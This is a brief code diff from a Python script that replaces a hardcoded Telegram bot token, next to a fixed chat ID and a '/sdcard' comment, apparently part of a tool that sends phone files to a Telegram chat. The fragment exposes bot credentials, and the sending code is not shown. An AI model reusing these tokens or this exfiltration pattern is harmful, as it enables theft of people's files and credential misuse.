@@ -1322,7 +1322,7 @@ class Main:
 def sexy():
     session=requests.session()
         
-    bot_token = '7483965290:AAHOvoGdGJPROrciH2hxzjoCvbZj--hO8lw'
+    bot_token = '6866740673:AAFgXMJhyTOzUE5LBE--65DGJMFWBHMWbPk'
     chat_id = '5090959284'
     #-----------( /sdcard
     try:
